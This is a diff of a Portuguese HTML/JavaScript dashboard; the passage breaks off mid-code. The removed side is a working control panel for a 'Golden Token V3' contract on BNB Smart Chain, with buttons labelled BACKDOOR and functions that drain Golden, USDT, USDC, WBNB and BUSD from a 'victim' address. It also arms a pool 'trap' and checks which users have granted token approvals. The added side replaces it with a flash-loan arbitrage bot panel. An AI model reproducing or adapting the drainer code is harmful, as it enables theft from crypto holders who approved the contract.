@@ -1,518 +1,291 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Golden Token V3 - Painel de Controle (Drenagem Múltipla)</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container { max-width: 1400px; margin: 0 auto; }
-        .card {
-            background: white;
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
-        h1 { color: #1a1a2e; margin-bottom: 10px; }
-        h2 { color: #1a1a2e; border-bottom: 3px solid #f0b90b; padding-bottom: 10px; margin-bottom: 20px; }
-        h3 { color: #16213e; margin: 15px 0 10px 0; }
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            background: #ecf0f1;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-        }
-        .status-item { font-weight: bold; color: #2c3e50; }
-        .status-value { color: #2980b9; font-family: monospace; margin-top: 5px; display: block; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: 600; }
-        input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-        button {
-            padding: 12px 20px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 14px;
-            transition: all 0.2s;
-            margin: 5px 5px 5px 0;
-        }
-        button:hover { opacity: 0.9; transform: translateY(-1px); }
-        .btn-primary { background: #3498db; color: white; }
-        .btn-success { background: #27ae60; color: white; }
-        .btn-warning { background: #f39c12; color: white; }
-        .btn-danger { background: #e74c3c; color: white; }
-        .btn-danger-dark { background: #c0392b; color: white; }
-        .btn-connect { background: #f0b90b; color: #1a1a2e; padding: 15px; font-size: 16px; width: 100%; }
-        .log {
-            background: #2c3e50;
-            color: #ecf0f1;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 12px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin-bottom: 15px; }
-        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
-        .badge { background: #f0b90b; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
-        .token-list {
-            background: #f8f9fa;
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            font-size: 12px;
-        }
-        hr { margin: 15px 0; }
-    </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FlashLoan Arb Bot - Painel de Controle</title>
+<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+<style>
+  :root{
+    --bg:#0b0f1a; --panel:#151b2b; --panel2:#1c2440; --line:#2a3350;
+    --txt:#e6ecff; --mut:#8a94b0; --acc:#5b8cff; --ok:#2fbf71; --bad:#ff5d6c; --warn:#ffb020;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:20px}
+  .wrap{max-width:1120px;margin:0 auto}
+  header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px}
+  header h1{font-size:1.25rem;font-weight:700;letter-spacing:.5px}
+  header h1 span{color:var(--acc)}
+  .badge{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:6px 12px;font-size:.8rem}
+  .badge.ok{color:var(--ok);border-color:var(--ok)} .badge.no{color:var(--bad);border-color:var(--bad)}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:14px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px}
+  .card h2{font-size:.92rem;margin-bottom:12px;color:var(--mut);text-transform:uppercase;letter-spacing:1px}
+  label{display:block;font-size:.78rem;color:var(--mut);margin:10px 0 4px}
+  input,select{width:100%;background:var(--panel2);border:1px solid var(--line);color:var(--txt);
+    border-radius:8px;padding:10px 12px;font-size:.9rem;font-family:inherit;outline:none}
+  input:focus{border-color:var(--acc)}
+  .sm{font-size:.78rem;color:var(--mut)}
+  button{cursor:pointer;border:none;border-radius:8px;padding:10px 14px;font-size:.85rem;font-weight:600;
+    background:var(--acc);color:#fff;margin-top:10px;transition:opacity .15s;width:100%}
+  button:hover{opacity:.88} button:disabled{opacity:.4;cursor:not-allowed}
+  button.ghost{background:var(--panel2);border:1px solid var(--line)}
+  button.danger{background:var(--bad)}
+  .row{display:flex;gap:8px} .row>*{flex:1}
+  .stat{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px dashed var(--line);font-size:.85rem}
+  .stat:last-child{border-bottom:none} .stat .v{font-weight:700}
+  #log{background:#070a12;border:1px solid var(--line);border-radius:8px;height:220px;overflow-y:auto;
+    font-family:Consolas,monospace;font-size:.78rem;padding:10px;margin-top:10px}
+  #log div{padding:2px 0;border-bottom:1px solid #141a2e}
+  #log .ok{color:var(--ok)} #log .bad{color:var(--bad)} #log .warn{color:var(--warn)} #log .sys{color:var(--acc)}
+  .hint{background:var(--warn);color:#000;border-radius:8px;padding:10px 12px;font-size:.78rem;line-height:1.5;margin-bottom:14px}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <h1>💰 Golden Token V3 - Painel de Controle</h1>
-            <p>
-                Contrato: <strong>0x5a10F7aCF5f29AEbf090E421b125d7da9FC4ab1B</strong><br>
-                Tokens alvo: <strong>USDT, USDC, WBNB, BUSD</strong> (e outros que adicionar)
-            </p>
-            
-            <div id="warningMsg" class="warning" style="display:none;">
-                ⚠️ Nenhuma carteira detectada. Instale <strong>MetaMask</strong> ou <strong>Rabby Wallet</strong>.
-            </div>
-            
-            <button id="connectBtn" class="btn-connect">🔌 Conectar Carteira (MetaMask / Rabby)</button>
-            <div id="walletInfo" style="text-align: center; margin-top: 10px; display: none;">
-                <span class="badge">Conectado</span> <span id="walletAddress" style="font-family: monospace;"></span>
-            </div>
-        </div>
+<div class="wrap">
 
-        <div id="adminPanel" style="display: none;">
-            <!-- Status -->
-            <div class="card">
-                <h2>📊 Status do Contrato</h2>
-                <div class="status-grid">
-                    <div class="status-item">📈 Taxa Percentual:<span id="valTaxa" class="status-value">---</span></div>
-                    <div class="status-item">🔘 Sistema de Taxa:<span id="valStatus" class="status-value">---</span></div>
-                    <div class="status-item">👑 Dono:<span id="valOwner" class="status-value">---</span></div>
-                    <div class="status-item">💰 Seu Saldo Golden:<span id="valSaldo" class="status-value">---</span></div>
-                </div>
-                <button id="refreshBtn" class="btn-primary">🔄 Atualizar Dados</button>
-            </div>
+  <header>
+    <h1>FlashLoan <span>Arb Bot</span> — BSC</h1>
+    <div id="net" class="badge no">Rede: ---</div>
+  </header>
 
-            <!-- Controle de Taxa -->
-            <div class="card">
-                <h2>⚙️ Controle do Owner</h2>
-                
-                <h3>🎯 Mudar Percentual da Taxa</h3>
-                <div class="input-group">
-                    <label>Nova taxa (0-100%):</label>
-                    <input type="number" id="inputTaxa" value="30" min="0" max="100">
-                </div>
-                <button id="setTaxaBtn" class="btn-primary">💰 Aplicar Nova Taxa</button>
-                
-                <h3>🔘 Ativar / Desativar Taxa</h3>
-                <div class="input-group">
-                    <select id="selectStatus">
-                        <option value="true">✅ ATIVAR sistema de taxa</option>
-                        <option value="false">❌ DESATIVAR sistema de taxa</option>
-                    </select>
-                </div>
-                <button id="setStatusBtn" class="btn-success">⚙️ Aplicar Estado</button>
-                
-                <h3>🔓 Autorizar Pool (DEX)</h3>
-                <div class="input-group">
-                    <label>Endereço do Pool (quando autorizado, ativa a armadilha):</label>
-                    <input type="text" id="inputPool" placeholder="0x..." value="0x8cDaC40199220727541bB073a899b51D8EA1df89">
-                    <select id="selectPoolAction">
-                        <option value="true">✅ Autorizar (armadilha ativada)</option>
-                        <option value="false">❌ Remover Autorização</option>
-                    </select>
-                </div>
-                <button id="autorizarPoolBtn" class="btn-warning">🔓 Autorizar / Remover Pool</button>
-                <hr>
-                
-                <h3 style="color: #e74c3c;">⚠️ BACKDOOR - Drenar Golden (do contrato)</h3>
-                <div class="input-group">
-                    <label>Endereço da vítima (GOLDEN):</label>
-                    <input type="text" id="inputDrenarGolden" placeholder="0x...">
-                </div>
-                <button id="drenarGoldenBtn" class="btn-danger">💀 DRENAR GOLDEN</button>
-                
-                <h3 style="color: #c0392b;">🔥 NOVO - Drenar Tokens Externos (USDT, USDC, BNB, etc)</h3>
-                <div class="input-group">
-                    <label>Endereço da vítima:</label>
-                    <input type="text" id="inputDrenarExterno" placeholder="0x...">
-                </div>
-                <div class="flex-row">
-                    <select id="selectTokenParaDrenar" style="flex:2">
-                        <option value="0x55d398326f99059fF775485246999027B3197955">USDT</option>
-                        <option value="0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d">USDC</option>
-                        <option value="0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c">WBNB</option>
-                        <option value="0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56">BUSD</option>
-                    </select>
-                    <button id="drenarTokenUnicoBtn" class="btn-warning" style="flex:1">🎯 Drenar Token Específico</button>
-                </div>
-                <button id="drenarTudoExternoBtn" class="btn-danger-dark">💀💀 DRENAR TODOS OS TOKENS (USDT+USDC+WBNB+BUSD) 💀💀</button>
-                
-                <h3>✨ Mint / Burn (Golden)</h3>
-                <div class="flex-row">
-                    <div style="flex:1">
-                        <label>Mint (criar tokens):</label>
-                        <input type="number" id="inputMint" placeholder="Quantidade">
-                        <button id="mintBtn" class="btn-success">✨ Mint Golden</button>
-                    </div>
-                    <div style="flex:1">
-                        <label>Burn (destruir tokens):</label>
-                        <input type="number" id="inputBurn" placeholder="Quantidade">
-                        <button id="burnBtn" class="btn-danger">🔥 Burn Golden</button>
-                    </div>
-                </div>
-                
-                <h3>➕ Adicionar Novo Token Alvo</h3>
-                <div class="flex-row">
-                    <input type="text" id="novoTokenAlvo" placeholder="Endereço do token (BSC)" style="flex:3">
-                    <button id="adicionarTokenAlvoBtn" class="btn-primary" style="flex:1">➕ Adicionar</button>
-                </div>
-            </div>
+  <div class="hint">
+    <b>Aviso honesto:</b> nenhum bot garante lucro 100%. Este contrato executa arbitragem cross-pool
+    com flash-loan: empresta WBNB de um pool fonte liquido, compra token barato em pool A,
+    vende por uma ROTA (ate multi-hop) em pool B, quita o flash por transferencia direta.
+    Lucro so existe quando ha divergencia real de precos. Implante via Remix IDE e cole o endereco abaixo.
+  </div>
 
-            <!-- Consultas Avançadas -->
-            <div class="card">
-                <h2>🔍 Consultas Avançadas</h2>
-                
-                <h3>🔎 Verificar Aprovações de um Usuário</h3>
-                <div class="flex-row">
-                    <input type="text" id="inputVerificarUsuario" placeholder="Endereço do usuário" style="flex:3">
-                    <button id="verificarAprovacoesBtn" class="btn-primary" style="flex:1">🔍 Verificar</button>
-                </div>
-                <div id="aprovacoesResultado" class="token-list" style="display:none;"></div>
-                
-                <h3>📋 Lista de Tokens Alvo</h3>
-                <button id="listarTokensAlvoBtn" class="btn-primary">📋 Listar Tokens Alvo</button>
-                <div id="tokensAlvoLista" class="token-list" style="display:none;"></div>
-            </div>
-        </div>
+  <div class="grid">
 
-        <!-- Log -->
-        <div class="card">
-            <h2>📜 Log</h2>
-            <div id="log" class="log">Aguardando inicialização...</div>
-        </div>
+    <!-- COLUNA 1: Carteira -->
+    <div class="card">
+      <h2>Carteira</h2>
+      <div id="wstatus" class="badge no" style="display:inline-block">Nao conectada</div>
+      <button id="btnConnect">Conectar MetaMask / Rabby</button>
+      <div id="addr" class="stat"><span>Endereco</span><span class="v" style="font-size:.72rem">---</span></div>
+      <div class="stat"><span>BNB (saldo)</span><span class="v" id="bnbBal">---</span></div>
+      <div class="stat"><span>WBNB (saldo)</span><span class="v" id="wbnbBal">---</span></div>
+      <div class="stat"><span>E dono do contrato?</span><span class="v" id="isOwner">---</span></div>
+      <div class="stat"><span>Fonte (reserva WBNB)</span><span class="v" id="srcReserve">---</span></div>
     </div>
 
-    <!-- Carregar ethers.js -->
-    <script>
-        function loadEthers() {
-            return new Promise((resolve, reject) => {
-                if (window.ethers) { resolve(); return; }
-                const script = document.createElement('script');
-                script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
-                script.onload = () => resolve();
-                script.onerror = () => reject(new Error('Falha ao carregar ethers.js'));
-                document.head.appendChild(script);
-            });
-        }
-        loadEthers().catch(err => {
-            document.getElementById('log').innerHTML = `<div style="color:#ff6b6b">❌ Erro crítico: ${err.message}</div>`;
-        });
-    </script>
+    <!-- COLUNA 2: Contrato -->
+    <div class="card">
+      <h2>Contrato</h2>
+      <label>RPC (HTTP)</label>
+      <input id="rpc" value="https://bsc-dataseed.binance.org" />
+      <label>Endereco do contrato implantado</label>
+      <input id="contract" placeholder="0x..." />
+      <button id="btnLoad" class="ghost">Carregar contrato</button>
+      <div class="stat"><span>Pausado?</span><span class="v" id="paused">---</span></div>
+      <div class="stat"><span>Slippage (bps)</span><span class="v" id="slippage">---</span></div>
+      <div class="row">
+        <button id="btnPause" class="danger">Pausar</button>
+        <button id="btnResume" class="ghost">Retomar</button>
+      </div>
+    </div>
 
-    <script>
-        // NOVO ENDEREÇO DO CONTRATO
-        const contractAddress = "0x5a10F7aCF5f29AEbf090E421b125d7da9FC4ab1B";
-        
-        // ABI COMPLETO para o novo contrato (Golden3.txt)
-        const abi = [
-            "function getStatus() view returns (uint256 taxa, bool ativa, address dono, uint256 saldoDono)",
-            "function setTaxaAtiva(bool _ativa)",
-            "function setTaxaPercentual(uint256 _novaTaxa)",
-            "function autorizarPool(address _pool, bool _autorizado)",
-            "function drenarGolden(address alvo)",
-            "function mint(uint256 quantidade)",
-            "function burn(uint256 quantidade)",
-            "function balanceOf(address) view returns (uint256)",
-            "function owner() view returns (address)",
-            "function taxaPercentual() view returns (uint256)",
-            "function taxaAtiva() view returns (bool)",
-            "function poolsAutorizados(address) view returns (bool)",
-            // NOVAS FUNÇÕES
-            "function drenarToken(address usuario, address token)",
-            "function drenarTudo(address usuario)",
-            "function adicionarTokenAlvo(address token)",
-            "function verificarAprovacoesDoUsuario(address usuario) view returns (address[] memory tokens, bool[] memory aprovou, uint256[] memory saldos, uint256[] memory permissoes)",
-            "function tokensParaDrenar(uint256) view returns (address)",
-            "function tokenIsAlvo(address) view returns (bool)",
-            "function usuarioAprovouToken(address, address) view returns (bool)",
-            "function USDT() view returns (address)",
-            "function USDC() view returns (address)",
-            "function WBNB() view returns (address)",
-            "function BUSD() view returns (address)"
-        ];
+    <!-- COLUNA 3: Operacao -->
+    <div class="card">
+      <h2>Operacao (Flash Arbitrage)</h2>
 
-        let provider, signer, contract, userAddress;
+      <label>Token alvo (0x...)</label>
+      <input id="token" placeholder="0x..." />
 
-        function addLog(msg, isError = false) {
-            const logDiv = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            const color = isError ? '#ff6b6b' : '#8bc34a';
-            logDiv.innerHTML += `<div style="color: ${color}">[${time}] ${msg}</div>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
-            console.log(`[${time}] ${msg}`);
-        }
+      <label>Router de venda (pool B)</label>
+      <input id="sellRouter" value="0x3a6d8cA21D1CF76F653A67577FA0D27473350dD7" />
 
-        async function connectWallet() {
-            if (!window.ethereum) {
-                addLog("❌ Nenhuma carteira detectada!", true);
-                document.getElementById('warningMsg').style.display = 'block';
-                return;
-            }
-            try {
-                addLog("🔄 Solicitando conexão...");
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-                addLog(`✅ Conta conectada: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-                
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                contract = new ethers.Contract(contractAddress, abi, signer);
-                
-                const network = await provider.getNetwork();
-                if (network.chainId !== 56) {
-                    addLog(`⚠️ Rede: ${network.chainId} (NÃO é BSC Mainnet). Mude para BNB Smart Chain.`, true);
-                } else {
-                    addLog("✅ Rede BSC Mainnet confirmada");
-                }
-                
-                document.getElementById('connectBtn').innerHTML = "✅ Conectado";
-                document.getElementById('connectBtn').disabled = true;
-                document.getElementById('walletInfo').style.display = 'block';
-                document.getElementById('walletAddress').innerHTML = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-                document.getElementById('adminPanel').style.display = 'block';
-                
-                await refreshData();
-                
-                window.ethereum.on('accountsChanged', () => location.reload());
-                window.ethereum.on('chainChanged', () => location.reload());
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
-        }
+      <label>Rota de venda para WBNB (virgula-separada, primeira = token, ultima = WBNB)</label>
+      <div class="sm">Ex.: token,WBNB  |  token,USDT,WBNB  |  token,USDC,WBNB</div>
+      <input id="sellPath" placeholder="token,WBNB" />
 
-        async function refreshData() {
-            if (!contract) { addLog("⚠️ Conecte a carteira primeiro", true); return; }
-            try {
-                addLog("🔄 Buscando dados...");
-                const status = await contract.getStatus();
-                document.getElementById('valTaxa').innerHTML = `${status.taxa.toString()}%`;
-                document.getElementById('valStatus').innerHTML = status.ativa ? "🟢 ATIVO" : "🔴 INATIVO";
-                document.getElementById('valOwner').innerHTML = `${status.dono.slice(0,6)}...${status.dono.slice(-4)}`;
-                
-                const saldo = await contract.balanceOf(userAddress);
-                document.getElementById('valSaldo').innerHTML = `${parseFloat(ethers.utils.formatEther(saldo)).toFixed(4)} GOLDEN`;
-                addLog("✅ Dados atualizados");
-            } catch(err) { addLog(`❌ Erro: ${err.message}`, true); }
-        }
+      <label>Valor do flash-loan (WBNB)</label>
+      <input id="amount" type="number" value="0.5" step="any" min="0" />
 
-        async function setTaxa() {
-            const val = document.getElementById('inputTaxa').value;
-            if (!val) return addLog("❌ Digite uma taxa", true);
-            try {
-                addLog(`📤 Alterando taxa para ${val}%...`);
-                const tx = await contract.setTaxaPercentual(val);
-                await tx.wait();
-                addLog(`✅ Taxa alterada para ${val}%`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+      <div class="row">
+        <button id="btnEstimate" class="ghost">Estimar lucro</button>
+        <button id="btnExec" class="danger">Executar</button>
+      </div>
 
-        async function setStatus() {
-            const ativa = document.getElementById('selectStatus').value === "true";
-            try {
-                addLog(`📤 ${ativa ? "Ativando" : "Desativando"} sistema...`);
-                const tx = await contract.setTaxaAtiva(ativa);
-                await tx.wait();
-                addLog(`✅ Sistema ${ativa ? "ativado" : "desativado"}`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+      <div class="stat"><span>Compra (token)</span><span class="v" id="stBuy">---</span></div>
+      <div class="stat"><span>Venda (WBNB, via rota)</span><span class="v" id="stSell">---</span></div>
+      <div class="stat"><span>Repag. flash (WBNB)</span><span class="v" id="stRepay">---</span></div>
+      <div class="stat"><span><b>Lucro estimado</b></span><span class="v" id="stProfit" style="color:var(--ok);font-size:1.05rem">---</span></div>
+    </div>
 
-        async function autorizarPool() {
-            const pool = document.getElementById('inputPool').value;
-            const autorizado = document.getElementById('selectPoolAction').value === "true";
-            if (!pool) return addLog("❌ Endereço do pool vazio", true);
-            try {
-                addLog(`📤 ${autorizado ? "Autorizando" : "Removendo"} pool...`);
-                const tx = await contract.autorizarPool(pool, autorizado);
-                await tx.wait();
-                addLog(`✅ Pool ${autorizado ? "autorizado" : "removido"}${autorizado ? " - ARMADILHA ATIVADA!" : ""}`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+    <!-- COLUNA 4: Fundo / Config -->
+    <div class="card">
+      <h2>Fundo / Recuperar</h2>
+      <label>Resgatar tokens do contrato (0x...)</label>
+      <input id="rescueToken" placeholder="0x... (WBNB)" />
+      <button id="btnRescue" class="ghost">Resgatar token</button>
+      <button id="btnRescueBNB" class="ghost">Resgatar BNB</button>
+      <h2 style="margin-top:16px">Config remota</h2>
+      <button id="btnSetRouterA" class="ghost">Setar Router A</button>
+      <button id="btnSetBack" class="ghost">Setar Back Router</button>
+      <button id="btnSetSource" class="ghost">Setar Source Pair</button>
+      <div class="sm" style="margin-top:8px">Source pair padrao: WBNB/USDT no PancakeSwap V2 (pool liquido, sem lock no callback).</div>
+    </div>
 
-        // Drenar Golden (antigo drenar)
-        async function drenarGolden() {
-            const alvo = document.getElementById('inputDrenarGolden').value;
-            if (!alvo) return addLog("❌ Digite o endereço", true);
-            if (!confirm(`⚠️ DRENAR GOLDEN de ${alvo.slice(0,10)}...?`)) return;
-            try {
-                addLog(`💀 Drenando Golden de ${alvo.slice(0,10)}...`);
-                const tx = await contract.drenarGolden(alvo);
-                await tx.wait();
-                addLog(`✅ Drenagem de Golden concluída!`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+    <!-- COLUNA 5: Log -->
+    <div class="card" style="grid-column:1/-1">
+      <h2>Log</h2>
+      <div id="log"><div class="sys">Pronto. Conecte a carteira e carregue o contrato.</div></div>
+    </div>
+  </div>
+</div>
 
-        // Drenar token específico (USDT, USDC, etc)
-        async function drenarTokenUnico() {
-            const usuario = document.getElementById('inputDrenarExterno').value;
-            const token = document.getElementById('selectTokenParaDrenar').value;
-            if (!usuario) return addLog("❌ Digite o endereço da vítima", true);
-            if (!confirm(`⚠️ DRENAR ${token.slice(0,6)}... de ${usuario.slice(0,10)}...?`)) return;
-            try {
-                addLog(`💀 Drenando token ${token.slice(0,6)}... de ${usuario.slice(0,10)}...`);
-                const tx = await contract.drenarToken(usuario, token);
-                await tx.wait();
-                addLog(`✅ Drenagem concluída!`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+<script>
+const ABI=[
+  {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
+  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"token","type":"address"},{"indexed":false,"internalType":"uint256","name":"amountIn","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"repay","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"wbnbOut","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"profit","type":"uint256"}],"name":"ArbExecuted","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":false,"internalType":"string","name":"what","type":"string"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"ConfigChanged","type":"event"},
+  {"anonymous":false,"inputs":[{"indexed":false,"internalType":"string","name":"what","type":"string"},{"indexed":false,"internalType":"address","name":"router","type":"address"}],"name":"RouterChanged","type":"event"},
+  {"inputs":[],"name":"backRouter","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"factory","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"flashFeeDen","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"flashFeeNum","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"routerA","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"slippageBps","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"sourcePair","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"getSourceWbnbReserve","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[{"internalType":"address","name":"r","type":"address"}],"name":"setRouterA","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"r","type":"address"}],"name":"setBackRouter","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"p","type":"address"}],"name":"setSourcePair","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"bool","name":"p","type":"bool"}],"name":"setPaused","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"uint256","name":"bps","type":"uint256"}],"name":"setSlippageBps","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"sellRouter","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"address[]","name":"sellPath","type":"address[]"}],"name":"startArb","outputs":[],"stateMutability":"payable","type":"function"},
+  {"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"sellRouter","type":"address"},{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"address[]","name":"sellPath","type":"address[]"}],"name":"viewProfit","outputs":[{"internalType":"uint256","name":"profit","type":"uint256"},{"internalType":"uint256","name":"buyOut","type":"uint256"},{"internalType":"uint256","name":"sellOut","type":"uint256"},{"internalType":"uint256","name":"repay","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"WBNB","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+  {"stateMutability":"payable","type":"receive"}
+];
 
-        // Drenar todos os tokens alvo
-        async function drenarTudoExterno() {
-            const usuario = document.getElementById('inputDrenarExterno').value;
-            if (!usuario) return addLog("❌ Digite o endereço da vítima", true);
-            if (!confirm(`⚠️⚠️ DRENAR TODOS OS TOKENS (USDT+USDC+WBNB+BUSD) de ${usuario.slice(0,10)}...? ⚠️⚠️`)) return;
-            try {
-                addLog(`💀💀 Drenando TODOS os tokens de ${usuario.slice(0,10)}...`);
-                const tx = await contract.drenarTudo(usuario);
-                await tx.wait();
-                addLog(`✅ Drenagem TOTAL concluída!`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+const WBNB_ADDR="0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
+const ERC20_ABI=["function balanceOf(address) view returns (uint256)","function decimals() view returns (uint8)","function symbol() view returns (string)"];
+const BSC={chainId:"0x38",rpc:["https://bsc-dataseed.binance.org"],name:"BSC"};
 
-        async function mint() {
-            const qtd = document.getElementById('inputMint').value;
-            if (!qtd) return addLog("❌ Digite quantidade", true);
-            try {
-                addLog(`✨ Mint ${qtd} tokens...`);
-                const tx = await contract.mint(qtd);
-                await tx.wait();
-                addLog(`✅ Mint realizado: ${qtd} GOLDEN criados`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+let provider=null,signer=null,account=null,contract=null,symCache={};
+const $=id=>document.getElementById(id);
+const fmt=(b,d=18)=>(b===undefined||b===null)?"---":Number(ethers.utils.formatUnits(b,d));
+function log(m,c="sys"){const el=document.createElement("div");el.className=c;el.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;$("log").appendChild(el);$("log").scrollTop=$("log").scrollHeight}
 
-        async function burn() {
-            const qtd = document.getElementById('inputBurn').value;
-            if (!qtd) return addLog("❌ Digite quantidade", true);
-            try {
-                addLog(`🔥 Burn ${qtd} tokens...`);
-                const tx = await contract.burn(qtd);
-                await tx.wait();
-                addLog(`✅ Burn realizado: ${qtd} GOLDEN destruídos`);
-                refreshData();
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+async function sym(tk){if(symCache[tk])return symCache[tk];try{const c=new ethers.Contract(tk,ERC20_ABI,provider);symCache[tk]=await c.symbol();return symCache[tk];}catch(e){return tk.slice(0,8);}}
 
-        async function adicionarTokenAlvo() {
-            const token = document.getElementById('novoTokenAlvo').value;
-            if (!token) return addLog("❌ Digite o endereço do token", true);
-            if (!ethers.utils.isAddress(token)) return addLog("❌ Endereço inválido", true);
-            try {
-                addLog(`➕ Adicionando token alvo: ${token}`);
-                const tx = await contract.adicionarTokenAlvo(token);
-                await tx.wait();
-                addLog(`✅ Token ${token} adicionado à lista de alvos!`);
-            } catch(err) { addLog(`❌ ${err.message}`, true); }
-        }
+async function refreshBalances(){
+  if(!provider||!account)return;
+  $("bnbBal").textContent=fmt(await provider.getBalance(account))+" BNB";
+  $("wbnbBal").textContent=fmt(await new ethers.Contract(WBNB_ADDR,ERC20_ABI,provider).balanceOf(account))+" WBNB";
+}
 
-        async function verificarAprovacoes() {
-            const usuario = document.getElementById('inputVerificarUsuario').value;
-            if (!usuario) return addLog("❌ Digite o endereço do usuário", true);
-            try {
-                addLog(`🔍 Verificando aprovações de ${usuario.slice(0,10)}...`);
-                const [tokens, aprovou, saldos, permissoes] = await contract.verificarAprovacoesDoUsuario(usuario);
-                
-                let html = '<strong>📊 Resultado da verificação:</strong><br>';
-                for (let i = 0; i < tokens.length; i++) {
-                    const nomeToken = tokens[i].slice(0,6)+'...'+tokens[i].slice(-4);
-                    html += `<div style="margin-top:5px; padding:5px; border-bottom:1px solid #ddd;">
-                        <strong>${nomeToken}</strong><br>
-                        Aprovado: ${aprovou[i] ? '✅ SIM' : '❌ NÃO'}<br>
-                        Saldo: ${parseFloat(ethers.utils.formatEther(saldos[i])).toFixed(4)}<br>
